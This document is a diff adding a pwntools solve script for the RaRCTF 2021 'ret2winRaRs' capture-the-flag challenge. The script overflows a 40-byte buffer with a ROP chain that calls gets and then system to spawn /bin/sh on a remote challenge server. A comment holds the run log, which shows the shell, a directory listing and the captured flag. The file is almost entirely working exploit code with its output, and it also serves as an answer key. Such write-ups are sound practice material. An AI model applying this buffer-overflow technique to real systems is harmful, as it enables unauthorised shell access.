@@ -1,0 +1,57 @@
+from pwn import *
+
+#context(os='linux', arch='amd64')
+#context.log_level = 'debug'
+
+BINARY = './ret2winrars'
+elf  = ELF(BINARY)
+
+if len(sys.argv) > 1 and sys.argv[1] == 'r':
+  HOST = "193.57.159.27"
+  PORT = 26141
+  s = remote(HOST, PORT)
+else:
+  s = process(BINARY)
+
+pop_rdi_ret = 0x40124b # pop rdi; ret; 
+bss_addr    = 0x404100
+
+s.recvuntil("Please enter your WinRaR license key to get access: ")
+
+buf  = "A"*40
+buf += p64(pop_rdi_ret)
+buf += p64(bss_addr)
+buf += p64(elf.plt.gets)
+buf += p64(pop_rdi_ret)
+buf += p64(bss_addr)
+buf += p64(elf.plt.system)
+s.sendline(buf)
+
+sleep(0.3)
+s.sendline("/bin/sh\x00")
+
+s.interactive()
+
+'''
+mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_ret2winRaRs_150$ python solve.py r
+[*] '/home/mito/CTF/RaRCTF_2021/Pwn_ret2winRaRs_150/ret2winrars'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to 193.57.159.27 on port 26141: Done
+[*] Switching to interactive mode
+$ id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+$ ls -l
+total 36
+-rwxr-x---. 1 root ctf   427 Aug  5 15:58 Dockerfile
+-rwxr-x---. 1 root ctf   524 Aug  5 15:34 ctf.xinetd
+-rwxr-x---. 1 root ctf    61 Aug  5 15:31 flag.txt
+-rwxr-x---. 1 root ctf 16728 Aug  5 16:23 ret2winrars
+-rwxr-x---. 1 root ctf    50 Aug  5 16:37 start.sh
+$ cat flag.txt
+rarctf{0h_1_g3t5_1t_1t5_l1k3_ret2win_but_w1nr4r5_df67123a66}
+'''
+
